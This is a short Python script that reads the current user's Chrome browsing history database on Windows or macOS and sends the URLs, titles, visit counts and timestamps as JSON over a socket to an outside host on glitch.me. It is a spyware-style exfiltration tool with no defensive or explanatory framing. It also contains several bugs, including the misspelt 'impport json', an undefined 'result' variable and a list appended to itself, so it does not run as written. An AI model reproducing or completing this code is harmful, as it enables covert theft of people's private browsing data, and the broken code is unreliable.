import os
import sqlite3
# import pandas as pd
import time
username=os.getlogin()
#check for windows/mac
dir=""
if os.name == 'nt':
  dir="C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\".format(username)
else:
  dir="/Users/"+username+"/Library/Application Support/Google/Chrome/Default"
files = os.listdir(dir)
history_db = os.path.join(dir, 'history')
print(history_db)

c = sqlite3.connect(history_db)
cursor = c.cursor()
select_statement = "SELECT id,url,title,visit_count,last_visit_time FROM urls"
cursor.execute(select_statement)

results = cursor.fetchall()
ids = []
urls = []
titles = []
visit_counts = []
last_visit_times = []

print(result)
time.sleep(5) 
for res in results:
    id,url,title,visit_count,last_visit_time = res
    print(id,url,title,visit_count,last_visit_time)
    ids.append(id)
    urls.append(urls)
    titles.append(title)
    visit_counts.append(visit_count)
    last_visit_times.append(last_visit_time)

impport json
rawobj = {
  "ids":ids,
  "urls":urls,
  "titles":titles,
  "visit_counts":visit_counts,
  "last_visit_times":last_visit_times
}
import time
jsonobj = json.dumps(rawobj)
jsonlen = len(jsonobj)
import socket, sys
server="toothsome-glow-packet.glitch.me"
port=8081
try:
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client.connect((server, port))
  client.send(str(jsonlen))
  stat=client.recv(2)
  if stat=="OK":
    client.send(jsonobj)
    time.sleep(1000)
    client.shutdown(socket.SHUT_RDWR)
    client.close()
    print("OK")
    sys.exit(0)
  else:
    client.shutdown(socket.SHUT_RDWR)
    client.close()
    print(stat)
    sys.exit(0)
except:
  print("Check your network connection and try again. Are you behind a firewall?")
  sys.exit(0)
